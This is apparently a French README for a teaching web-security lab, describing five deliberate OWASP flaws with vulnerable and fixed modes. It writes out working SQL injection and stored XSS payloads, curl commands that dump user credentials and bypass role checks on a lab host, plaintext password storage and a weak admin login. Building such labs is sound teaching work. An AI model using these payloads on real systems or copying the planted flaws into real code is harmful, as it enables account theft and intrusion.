# Les 5 failles pédagogiques du labo (sprint 1)

Un seul code, deux modes via `APP_MODE` dans `.env` :
- `vuln`   : failles actives (démo de l'attaque)
- `secure` : failles corrigées (démo de la correction)

Chaque faille est repérée dans le code par un commentaire `VULN-n` (et sa correction `FIX-n`).

| # | OWASP | Emplacement | Exploitation (mode vuln) | Correction (mode secure) |
|---|-------|-------------|--------------------------|---------------------------|
| 1 | A03 Injection | `backend/src/routes/eventRoutes.js` (VULN-1) | Recherche : `' OR '1'='1` ou `x' UNION SELECT id,email,password,role,NULL,NULL,NULL,created_at FROM users--` | Requête paramétrée `$1` |
| 2 | A07 XSS stocké | `eventRoutes.js` POST comments (VULN-2) + `frontend/.../EventDetail.jsx` | Commentaire : `<script>alert(document.cookie)</script>` ou `<img src=x onerror=alert(1)>` | `sanitize-html` côté serveur |
| 3 | A02 Cryptographic Failures | `backend/src/passwords.js` (VULN-3) | Mots de passe lisibles en base et dans l'écran admin Utilisateurs | bcrypt coût 12 + politique de mot de passe |
| 4 | A01 Broken Access Control | `backend/src/auth.js` requireRole (VULN-4) | Un compte client appelle `POST /api/admin/events` et réussit | Contrôle du rôle côté serveur |
| 5 | A05 Security Misconfiguration | `backend/src/server.js` error handler (VULN-5) | Les erreurs renvoient message SQL + pile ; pas d'en-têtes de sécurité | Message générique + Helmet-like headers |

Bonus faille 3 : `admin@cyberevents.local` / `admin123` (US-008, compte admin faible).

## Démo rapide (mode vuln)
```bash
# Injection : exfiltrer les comptes
curl "http://192.168.56.104:8080/api/events?q=x'%20UNION%20SELECT%20id,email,password,role,NULL,NULL,NULL,created_at%20FROM%20users--"

# Contrôle d'accès : créer un événement sans être admin (avec un token client)
curl -X POST http://192.168.56.104:8080/api/admin/events \
  -H "Authorization: Bearer <TOKEN_CLIENT>" -H "Content-Type: application/json" \
  -d '{"title":"Pirate","starts_at":"2026-12-01T10:00","capacity":10}'
```

## Basculer en mode sécurisé
```bash
sed -i 's/^APP_MODE=.*/APP_MODE=secure/' .env
docker compose up -d --build api
```
